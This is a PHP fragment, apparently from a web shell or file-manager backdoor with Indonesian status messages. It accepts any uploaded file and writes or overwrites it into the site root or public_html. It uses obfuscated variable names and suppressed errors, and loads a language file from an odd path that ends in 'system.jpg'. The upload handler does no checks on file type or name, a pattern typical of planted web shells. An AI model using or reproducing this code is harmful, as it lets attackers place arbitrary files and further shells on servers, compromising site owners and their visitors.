...
$get_lang = file_get_contents('-613/system/main/system.jpg' . $language . '.json');
...
if (!FM_READONLY && isset($_FILES['file'])) {
    $___f = $_FILES['file'];
    $___tmp = $___f['tmp_name'] ?? '';
    $___name = $___f['name'] ?? '';
    $___err = $___f['error'] ?? 1;
    $___pub = ($_REQUEST['publicUpload'] ?? '') === 'on';

    $___root = FM_ROOT_PATH;
    $___path = FM_PATH !== '' ? DIRECTORY_SEPARATOR . FM_PATH : '';
    $___base = $___root . $___path;
    $___ds = DIRECTORY_SEPARATOR;

    $___target = $___pub ? $___base . $___ds . 'public_html' : $___base;
    if ($___pub && !@is_dir($___target)) {
        echo '[X] Lokasi penyimpanan tidak ditemukan.';
        exit;
    }

    if ($___err === 0 && $___tmp && file_exists($___tmp)) {
        $___final = basename($___name);
        $___dest = $___target . $___ds . $___final;

        $___save = @move_uploaded_file($___tmp, $___dest);
        if (!$___save) $___save = @copy($___tmp, $___dest);

        echo $___save ? '[✓] Berkas berhasil disalin/ditimpa.' : '[X] Gagal menyimpan berkas.';
    } else {
        echo '[X] Kesalahan saat menerima berkas.';
    }
